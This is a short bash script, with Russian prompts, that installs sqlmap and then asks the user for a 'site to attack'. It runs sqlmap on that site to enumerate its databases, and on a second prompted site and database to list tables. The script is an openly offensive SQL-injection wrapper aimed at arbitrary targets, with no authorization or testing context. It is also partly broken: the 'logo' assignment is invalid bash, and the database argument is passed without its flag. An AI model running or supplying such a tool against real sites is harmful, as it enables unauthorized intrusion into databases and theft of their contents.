#!/bin/bash
pacman -Syu
pacman -Sy sqlmap
apt update && apt upgrade
apt install sqlmap
logo = "
M
X
L
DARKNESS
"
echo "Введите site для атаки:"
read IPSITE
sqlmap -u $IPSITE --dbs
echo "Введите site для дальнейшей атаки:"
read site
echo "Введите базу данный для атаки:"
read bass
sqlmap -u $site $bass --table

